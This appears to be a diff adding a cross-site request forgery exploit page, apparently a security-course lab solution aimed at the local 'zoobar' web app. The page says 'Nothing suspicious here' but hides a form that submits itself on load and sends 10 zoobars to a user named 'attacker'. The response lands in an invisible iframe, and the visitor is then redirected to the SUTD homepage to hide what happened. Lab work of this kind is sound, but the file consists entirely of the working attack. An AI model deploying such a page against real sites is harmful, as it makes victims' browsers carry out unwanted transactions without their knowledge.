@@ -1,0 +1,20 @@
+<h1> Redirecting to SUTD page</h1>
+<p>Nothing suspicious here</p>
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" style="display: none;" target="malicious-iframe">
+    <p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</p>
+    <p>to <input name=recipient type=text value="attacker" size=10></p>
+    <input type="submit" name="submission" value="Send">
+</form>
+<iframe id="malicious-iframe" name="malicious-iframe" src="" style="display: none;"></iframe>
+<script>
+    //Submits the form
+
+    document.forms[0].submit()
+
+    // Proceeds to redirect to sutd page
+    var malIframe = document.getElementById("malicious-iframe")
+    malIframe.addEventListener("load", function () {
+        window.location = "https://www.sutd.edu.sg/"
+    })
+
+</script>
